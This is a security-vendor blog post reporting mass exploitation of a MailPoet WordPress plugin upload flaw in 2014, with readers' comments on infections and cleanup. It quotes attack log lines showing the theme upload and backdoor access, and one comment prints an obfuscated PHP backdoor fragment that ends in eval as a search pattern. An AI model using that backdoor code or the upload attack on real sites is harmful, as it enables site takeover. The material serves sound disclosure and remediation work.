=== Content from blog.sucuri.net_5bb05c95_20250125_223243.html ===
  [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)
     [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
 [Login](https://dashboard.sucuri.net/login/)       [Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)
 Search for:  Search

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
# MailPoet Vulnerability Exploited in the Wild – Breaking Thousands of WordPress Sites

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* July 23, 2014

A few weeks ago we found and disclosed a serious vulnerability on the [MailPoet WordPress Plugin](https://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html). We urged everyone to upgrade their sites immediately due to the severity of the issue. The vulnerability allowed an attacker to inject anything they wanted on the site, which could be used for malware injections, defacement, spam and many more nefarious acts.

This is not something we’re excited to report, but we were right.

A few days ago [we started to see a massive number of WordPress sites compromised with malware](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html). The malware code had some bugs, it was breaking many websites, overwriting good files and appending various statements in loops at the end of files.

At the time of the post, the root cause of the malware injections was a bit of a mystery. After a frantic 72 hours, we are confirming that the attack vector for these compromises is the MailPoet vulnerability. To be clear, the MailPoet vulnerability is the entry point, it doesn’t mean your website has to have it enabled or that you have it on the website; if it resides on the server, in a neighboring website, it can still affect your website.

All the hacked sites were either using MailPoet or had it installed on another sites within the same shared account ([cross-contamination still matters](https://blog.sucuri.net/2012/03/a-little-tale-about-website-cross-contamination.html)).

##### Exploited in the Wild

The attacks always start the same, with the attackers trying to upload a custom (and malicious) theme to the site:

```
194.79.195.139 - - [05/Jul/2014:01:41:30 -0700] "POST /wp-admin/admin-post.php?page=wysija_campaigns&action=themes HTTP/1.0" 302 - "http://site.com.com/wp-admin/admin.php?page=wysija_campaigns&id=1&action=editTemplate" "Mozilla/5.0"

```

Once they succeed in uploading the malicious theme, they access their backdoor inside **/wp-content/uploads/wysija/themes/mailp/**:

```
194.79.195.139 - - [05/Jul/2014:01:41:31 -0700] "GET /wp-content/uploads/wysija/themes/mailp/index.php HTTP/1.1" 200 12 "Mozilla/5.0"
194.79.195.139 - - [05/Jul/2014:04:08:16 -0700] "GET /wp-content/uploads/wysija/themes/mailp/index.php?cookie=1 HTTP/1.0" 200 12 "-" "Mozilla/5.0 (Windows)"

```
##### The Result

They get full control of the site.

The backdoor is very nasty and creates an admin user called **1001001**. It also injects a backdoor code to all theme/core files. The biggest issue with this injection is that it often overwrites good files, making very hard to recover without a good backup in place.

So if you see this error on a site:

```
Parse error: syntax error, unexpected ')' in /home/user/public_html/site/wp-config.php on line 91

```

It means it was likely hacked through this vulnerability.

##### Mass Infections

MailPoet is a very popular plugin with almost **2 million downloads**, so as you can expect, when such severe vulnerability is identified, it can be mass exploited.

This is the total number of hacked sites that we were able to identify so far (per day):

![Sucuri-MailPoet-Infections](https://blog.sucuri.net/wp-content/uploads/2014/07/Sucuri-MailPoet-Infections.jpg)

This is based on sites scanned on our [free sitecheck scanner](http://sitecheck.sucuri.net). The number of hacked sites is likely much larger.

##### Upgrade Mailpoet!

If you are running MailPoet, we recommend upgrading it asap to the latest version. Users of our [Website Firewall (CloudProxy)](http://sucuri.net/website-firewall) have been protected against this threat since day 0. However, if you do not have a firewall (WAF) on your website, you have to upgrade the plugin or remove it altogether to avoid more issues.

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=120&d=mm&r=g)](https://blog.sucuri.net/author/dcid)
##### [Daniel Cid](https://blog.sucuri.net/author/dcid)

Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the GoDaddy Security Products group. He is also the founder of OSSEC and [CleanBrowsing](https://cleanbrowsing.org). You can find more about Daniel on his site [dcid.me](http://dcid.me) or on [Twitter: @danielcid](https://twitter.com/danielcid)

##### Related Tags

* [Website Backdoor](https://blog.sucuri.net/tag/website-backdoor),
* [WordPress Plugins and Themes](https://blog.sucuri.net/tag/wordpress-plugins-and-themes)
##### 36 comments

1. ![](https://secure.gravatar.com/avatar/0fd09c8a039ee38501db831faeec2984?s=60&d=mm&r=g) **Trev** says: [July 23, 2014 at 1:27 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3697)

   I ran into a problem this weekend as well, though I don’t have MailPoet on any of my sites. In fact, the only plugin on the site that was initially compromised was advanced code editor. It had a similar vulnerability(???) to Mailpoet, using is\_admin on line 65:

   public function advanced\_code\_editor(){

   if( is\_admin()){

   $this->tablename = ‘filemeta’;

   $this->version = ‘2.2.1’;

   //create new file admin ajax

   add\_action(‘wp\_ajax\_create\_file’, array($this,’ajax\_create

   ……..

   Does anyone know if this could result in the same problem?

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **Daniel Cid** says: [July 23, 2014 at 1:41 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3698)

      Anyway we can get access to your server logs to investigate? How many sites do you have on your server?

      If you can send us the details to labs@sucuri.net we would love to look at it.

      1. ![](https://secure.gravatar.com/avatar/0fd09c8a039ee38501db831faeec2984?s=60&d=mm&r=g) **user1202** says: [July 23, 2014 at 3:05 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3699)

         Sent.
   2. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **R Andom** says: [July 24, 2014 at 6:21 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3704)

      There are MANY MANY plugins with the is\_admin check in it. A quick FIND in FILES on my server shows:
       – NextGenGallery
       – Avada Theme
       – WooCommerce
       – W3totalcache
       – GoogleAnalyticsDashboard

      Anyone confirm this is the same exploit?

      1. ![](https://secure.gravatar.com/avatar/abce088ef4b1ccd9465346ea4889ee2c?s=60&d=mm&r=g) **[Marcel Ruhf](http://www.xonovahosting.com)** says: [July 25, 2014 at 2:48 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3713)

         is\_admin() is not an exploit, it merely checks whether the user using the plugin has admin privileges or not.

         1. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **R Andom** says: [July 25, 2014 at 3:10 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3714)

            Yes, I thought so. Any word on other vulnerabilities?
2. ![](https://secure.gravatar.com/avatar/e111d84cb6b49c85752667b86d0978af?s=60&d=mm&r=g) **At The Rubicon** says: [July 23, 2014 at 5:45 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-6021)

   Thank you for your hard work. I believe we were an indirect victim of this vulnerability. Our website was on a shared server and it is looking more and more like some other account on that server was infected. We are a Sucuri.net customer and our site is scanned by your system every few hours so I was pretty sure We had not been directly infected. Subsequent examination by your able staff verified that.

   Within the past few hours we have completed the move of our website to a different hosting company.

   Again, I really want to thank you for all your hard work.
3. ![](https://secure.gravatar.com/avatar/ade2e1a67a2b571fb750fcadafb31dbc?s=60&d=mm&r=g) **MX** says: [July 23, 2014 at 5:30 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3700)

   Why does the free sitecheck scanner not recognize the mailpoet malware infection of my website?

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **Daniel Cid** says: [July 23, 2014 at 5:41 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3701)

      What’s your site? It was supposed to find. Please send the details to labs@sucuri.net.

      1. ![](https://secure.gravatar.com/avatar/5965d0146ec2aadfddc983aa7d126044?s=60&d=mm&r=g) **MX** says: [July 23, 2014 at 6:05 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3702)

         Sent
4. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **R Andom** says: [July 24, 2014 at 6:15 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3703)

   Just to let you know – my site was hacked and I do not have MailPoet. All hacked sites had the “google-analytics-dashboard-for-wp” plugin, but also SEO plugins from Yoast and w3 total cache (and some others..)… Anyone else see similarities?

   1. ![](https://secure.gravatar.com/avatar/4983492a16100b18479920a1cb45232a?s=60&d=mm&r=g) **Chris Kadet** says: [July 24, 2014 at 3:53 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3712)

      Same here… it was another job board plugin that I was using that was vulnerable.
5. ![](https://secure.gravatar.com/avatar/56a64523de59c7710f43f6c13826b1a4?s=60&d=mm&r=g) **[PaulRjMuller](http://www.paulrjmuller.com)** says: [July 24, 2014 at 7:42 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3705)

   I’m on an independently managed VPS, with 8 sites on it. All were up to date but none had mailpoet. My server was infected with a mass spamming infection, sending out thousands of spam mailings a minute. had to uninstall sendmail to stop it. I’m still cleaning out the sites.

   Happened in the same window as the Mailpoet attacks, but no admin user added anywhere i can see. Several of the sites had w3 total cache and woocommerce. Not sure if this is an overlap or just really bad luck. Haven’t seen anyone talking about mass spam mailings.

   Cleaned a ton of rogue php files out of the wp-content folder, clean install of wordpress and database check for bad content. Still a long road ahead. Just wanted to give people a heads up that there are other nasties still out there.

   1. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **R Andom** says: [July 24, 2014 at 9:22 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3706)

      Thanks Woocommerce was already on my checklist – did you happen to have wp-google-analytics-dashboard?

      1. ![](https://secure.gravatar.com/avatar/7877d0b5ecec2092c3085de547e62ec3?s=60&d=mm&r=g) **WordPress user** says: [July 24, 2014 at 9:39 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3707)

         What have happened with “cache”? I’m not sure what it does on websites, but I’ve just during those days, when was attack, started Vordfence cache on my sites??? Thank you…..
      2. ![](https://secure.gravatar.com/avatar/56a64523de59c7710f43f6c13826b1a4?s=60&d=mm&r=g) **[PaulRjMuller](http://www.paulrjmuller.com)** says: [July 24, 2014 at 10:17 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3708)

         Nope none of the sites had wp-google analytics. Only new installed plugin was w3 total cache on the one site i’ve had a confirmed MYSQL injection on.

         So far the other sites i’ve looked into haven’t had a warning when scanning the databases. Anything i should be looking for in the access logs to see where it started?

         1. ![](https://secure.gravatar.com/avatar/b4d70a937f69b3a66a26287b4288a47a?s=60&d=mm&r=g) **R Andom** says: [July 24, 2014 at 10:19 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3710)

            Nope clueless as of yet …
      3. ![](https://secure.gravatar.com/avatar/56a64523de59c7710f43f6c13826b1a4?s=60&d=mm&r=g) **[PaulRjMuller](http://www.paulrjmuller.com)** says: [July 24, 2014 at 10:18 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3709)

         As is mentioned below I did have Yoast’s seo plugin on every site, but its been part of my default install for a long time. Never had any issues.
   2. ![](https://secure.gravatar.com/avatar/060943ef3cccc94d315bf8fb0c8cccb6?s=60&d=mm&r=g) **csfalcao** says: [July 26, 2014 at 7:08 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3715)

      My sites are ok – I’m not a MailPoet user – do you use some kind of security plugins, as Wordfence or iThemes Security?
   3. ![](https://secure.gravatar.com/avatar/a70276a9fe2a1f6c8dd0401aef659fee?s=60&d=mm&r=g) **Paul** says: [August 24, 2014 at 12:57 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3723)

      Are you running the ‘indus’ theme on any sites at all?

      1. ![](https://secure.gravatar.com/avatar/56a64523de59c7710f43f6c13826b1a4?s=60&d=mm&r=g) **[PaulRjMuller](http://www.paulrjmuller.com)** says: [September 15, 2014 at 10:22 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3725)

         sorry just saw this, nope not running that one. Various themes, a couple from woothemes, but not the indus theme
6. ![](https://secure.gravatar.com/avatar/00d86ced71f731edaaa482197376f44e?s=60&d=mm&r=g) **Ted** says: [July 24, 2014 at 11:41 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3711)

   Maybe this is naive, but isn’t the answer to this kind of thing simply to chown your wordpress directories and files to a non-privileged user and to give the user that runs Apache only read access? Manual updates seems like a small price to pay.

   1. ![](https://secure.gravatar.com/avatar/0e0e9e24dbbc45b788b93a9b22ef7a3c?s=60&d=mm&r=g) **[itoctopus](http://www.itoctopus.com/)** says: [July 24, 2014 at 4:47 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-6024)

      This would work, but you will need to switch though from suPHP to DSO (see: <http://www.itoctopus.com/why-you-should-use-dso-for-joomla-websites> ). If you’re using suPHP, then the files/folders must be owned by the web user, or else that won’t work. That’s why suPHP is not safe when you’re running a CMS. Because of the fact that web user must be the owner of the files, then file permissions of 444 will not fully protect your website, because if the web user owns a file, then it means the web user can change the permissions of that file.
7. ![](https://secure.gravatar.com/avatar/97ebf78e4c75d442be519e0c03436a61?s=60&d=mm&r=g) **[tony greene](http://113tidbits.com/)** says: [July 27, 2014 at 2:58 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3716)

   Does WordFence work for keeping this bugger out?

   1. ![](https://secure.gravatar.com/avatar/f0007b920fddf028bb9f392d828f64bb?s=60&d=mm&r=g) **[Nimrod Flores](http://nimrodflores.com/)** says: [August 1, 2014 at 2:18 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3719)

      If you enabled your regular scans, you should be notified early when you got attacked.

      I could be wrong, but I don’t think Wordfence can really “prevent” this kind of attack. In my usage, it only prevents brute force attack and gives me useful warnings and notifications.
8. ![](https://secure.gravatar.com/avatar/f8fa99b32d156cec2ff5aa58425743a7?s=60&d=mm&r=g) **Matt** says: [July 30, 2014 at 12:13 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3717)

   This trashed a WordPress installation of mine, which I have been cleaning up, but I have also found that a Drupal site running on the same shared hosting account has also been affected in the same way.
9. ![](https://secure.gravatar.com/avatar/c2f3ffcd6ea416da302cf206d6737605?s=60&d=mm&r=g) **Winston** says: [July 30, 2014 at 3:37 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3718)

   Fantastic work guys. Keep up the excellent vigilance 🙂
10. ![](https://secure.gravatar.com/avatar/06c8b571b6a88dcfb17de91de4900802?s=60&d=mm&r=g) **[Adam Silver](http://kitchensinkwp.com/)** says: [August 2, 2014 at 9:08 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3720)

    Thanks for the write up.. I am working with a client who got email warning from WordFence. She didn’t update in time. 🙁 I submitted the error to MailPoet and they confirmed that her site was infected. Sent back a 14 point list of best practice to clean the site. Working through it now.

    Just as note, the site in questions didnt have the two files/folders in the themes as desrcribed above, but rather a folder called “ejalhzli” and another called “sketchys”

    Removing and working through the check list.

    Additionally, I am doing this on a dev server (ServerPress) as first step not to make anything worse. Once done, I’ll move it back to production as a clean instance. Thats the plan in any case.
11. ![](https://secure.gravatar.com/avatar/f42f878cdc49bff18d5785a26cee8794?s=60&d=mm&r=g) **D** says: [August 15, 2014 at 3:27 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3721)

    Wish I had seen this earlier – they got me!
12. ![](https://secure.gravatar.com/avatar/a70276a9fe2a1f6c8dd0401aef659fee?s=60&d=mm&r=g) **Paul** says: [August 24, 2014 at 12:53 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3722)

    Simply upgrading mailpoet is not going to fix this issue for most sites, or servers that have already been infected.

    You need to do a text based search, for files containing text like this:

    $sF=”PCT4BA6ODSE\_”;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[‘n642afe’];if(isset($s22)){eval($s21($s22)

    This exploits does a nasty job on the servers, and send
13. ![](https://secure.gravatar.com/avatar/4a8deb722a11e777fd8e1d23e4b6326e?s=60&d=mm&r=g) **[Website-Bereinigung.de](http://website-bereinigung.de/)** says: [August 31, 2014 at 6:58 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3724)

    Thx for these helpful tips. That’s a really nasty infection! 15.000 of 15.020 PHP files modified, partially destroyed.. x\_x
     A nice example of how important it is to isolate each site.
14. ![](https://secure.gravatar.com/avatar/3142a4cdec793007ba8de149135050c2?s=60&d=mm&r=g) **Mary Frances Kirkpatrick, LCUP** says: [September 30, 2014 at 12:42 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3726)

    We are a non-profit, Literacy Council of Upper Pinellas, helping Adults to read and write in English. We are completely down as of today because of the the mailpoet virus. This is what my hosting companies security force suggests.
     Save the wp-config.php file, your images, and your personal files one by one (not the folder as it may contain unwanted files).

    – Wipe the entire folder where WordPress is installed.

    – Upload a new clean full package of the latest WordPress version.

    – Re-upload your wp-config.php file and images.

    – Re-upload or re-install the latest versions of your plugins and themes
     (it is recommended that you use original clean copies to ensure that
     the hacker/defacer did not leave any shell script files in your site).
     I don’t have any idea how to do the first four steps even when I get into the control panel. Can someone help me? We are heartbroken.
15. ![](https://secure.gravatar.com/avatar/53056f96698cc17f425b22b5736fa1d3?s=60&d=mm&r=g) **Francis** says: [October 15, 2014 at 5:01 pm](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-6069)

    It may as well have been a vulnerability of the plugin ‘Newsletter’ by Satollo. Had this installed and got the problems as described here at Sucuri, but please also see <http://www.satollo.net/forums/topic/security-issue-in-newsletter-plugin>
16. ![](https://secure.gravatar.com/avatar/f2a0a665caa2eaf328b7e0572014ccae?s=60&d=mm&r=g) **Mic** says: [January 29, 2015 at 12:22 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3727)

    How do you clean an infected site?
17. ![](https://secure.gravatar.com/avatar/047d0b51a2f083f6e858c96c94dbb37e?s=60&d=mm&r=g) **Ed** says: [February 10, 2015 at 11:28 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3728)

    We have just been hacked via this way and we had the latest version of MailPoet. I think there are still problems that have not been fixed.
18. ![](https://secure.gravatar.com/avatar/6ea5c9f4177500a406307899b3493a26?s=60&d=mm&r=g) **[Gagpistol](http://gagpistol.com/)** says: [February 17, 2015 at 11:24 am](https://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html#comment-3729)

    nice

Comments are closed.

##### Related Categories

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
##### You May Also Like

 ![Baidu to Google Redirects](https://blog.sucuri.net/wp-content/uploads/2018/04/04182018-from-baidu-to-google-open-redirects_en-blog-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [From Baidu to Google’s Open Redirects](https://blog.sucuri.net/2018/04/from-baidu-to-googles-open-redirects.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* April 18, 2018
 Last week, we described how an ongoing massive malware campaign began using Baidu search result links to redirect people to various ad and scam pages.…  [Read the Post](https://blog.sucuri.net/2018/04/from-baidu-to-googles-open-redirects.html)  ![](https://blog.sucuri.net/wp-content/uploads/2020/03/image2-4-390x183.png)

* [Security Education](https://blog.sucuri.net/category/security-education)
* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Evaluating Cookies to Hide Backdoors](https://blog.sucuri.net/2021/01/evaluating-cookies-to-hide-backdoors.html)

* [![](https://secure.gravatar.com/avatar/b020abf59d6245e6b2a4635063322498?s=20&d=mm&r=g)Luke Leal](https://blog.sucuri.net/author/luke "View all posts by Luke Leal")
* January 7, 2021
 Identifying website backdoors is not always an easy task. Since a backdoors primary function is to conceal itself while providing unauthorized access, they are often…  [Read the Post](https://blog.sucuri.net/2021/01/evaluating-cookies-to-hide-backdoors.html)  ![WordPress Redirect Hack via Test0.com/Default7.com](https://blog.sucuri.net/wp-content/uploads/2020/04/04212020_WordPress_Obfuscation_Dropper-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Obfuscated WordPress Malware Dropper](https://blog.sucuri.net/2020/04/obfuscated-wordpress-malware-dropper.html)

* [![](https://secure.gravatar.com/avatar/b020abf59d6245e6b2a4635063322498?s=20&d=mm&r=g)Luke Leal](https://blog.sucuri.net/author/luke "View all posts by Luke Leal")
* April 21, 2020
 It goes without saying that evasive maneuvering is at the top of a hacker’s priority list. Most often, they try to evade detection by obfuscating…  [Read the Post](https://blog.sucuri.net/2020/04/obfuscated-wordpress-malware-dropper.html)  ![AnonymousFox](https://blog.sucuri.net/wp-content/uploads/2022/06/BlogPost_FeatureImage_1490x700_AnonymousFoxFox-Cyber-Security-An-Overview-390x183.jpg)

* [Security Education](https://blog.sucuri.net/category/security-education)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [How to Find & Clean Up the AnonymousFox Hack](https://blog.sucuri.net/2022/06/how-to-find-clean-up-the-anonymousfox-hack.html)

* [![](https://secure.gravatar.com/avatar/814d8a855f60f285a7501fd7d0b13e17?s=20&d=mm&r=g)Cesar Anjos](https://blog.sucuri.net/author/cesarsucuri-net "View all posts by Cesar Anjos")
* June 28, 2022
 The AnonymousFox hack targets insecure websites and actively exploits them to spread phishing, spam, and other malware. A major nuisance for website owners, it also…  [Read the Post](https://blog.sucuri.net/2022/06/how-to-find-clean-up-the-anonymousfox-hack.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og-servers-390x205.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [Self-destruct malware](https://blog.sucuri.net/2019/07/self-destruct-malware.html)

* [![](https://secure.gravatar.com/avatar/df2487806812cf3a45af64a37a1e0daf?s=20&d=mm&r=g)Krasimir Konov](https://blog.sucuri.net/author/krasimir "View all posts by Krasimir Konov")
* July 31, 2019
 The majority of malware we find on compromised websites have been planted by bad actors with the intention of concealing and accessing backdoor access. During…  [Read the Post](https://blog.sucuri.net/2019/07/self-destruct-malware.html)  ![Simple Include Statement Hides Casino Spam](https://blog.sucuri.net/wp-content/uploads/2024/11/Blog-Post-Simple-Include-Statement-Hides-Casino-Spam-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Simple Include Statement Hides Casino Spam](https://blog.sucuri.net/2024/11/simple-include-statement-hides-casino-spam.html)

* [![](https://secure.gravatar.com/avatar/fc10f7183497b21189ca2137d48912e6?s=20&d=mm&r=g)Kayleigh Martin](https://blog.sucuri.net/author/kayleigh "View all posts by Kayleigh Martin")
* November 14, 2024
 Just as there are countless types of websites on the internet, there are just as many attackers seeking to exploit them. These attackers develop malicious…  [Read the Post](https://blog.sucuri.net/2024/11/simple-include-statement-hides-casino-spam.html)  ![Reverse String WooCommerce](https://blog.sucuri.net/wp-content/uploads/2020/07/reverse-string-390x183.png)

* [Ecommerce Security](https://blog.sucuri.net/category/ecommerce-security)
* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Reverse String WooCommerce WordPress Credit Card Swiper](https://blog.sucuri.net/2020/07/reverse-string-woocommerce-wordpress-credit-card-swiper.html)

